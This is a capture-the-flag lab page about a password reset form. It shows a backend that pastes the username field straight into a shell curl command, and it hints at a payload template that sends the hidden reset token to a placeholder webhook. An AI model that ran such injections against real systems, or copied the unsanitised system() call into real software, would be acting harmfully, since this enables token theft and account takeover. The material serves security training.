LAB 17: OOB LOGIC TRAP

Password Reset Vulnerability

The system sends a reset token to the user's email.
However, the email sending function seems to be susceptible to Out-Of-Band (OOB) injection via the username field.

Reset Password
CTF Hint:
The backend executes a command similar to:
system("curl " + email_server + "?user=" + username)
Try to inject a payload that forces the server to curl YOUR webhook with the hidden token.
Payload format: http_exfil('http://YOUR-WEBHOOK/?t=')
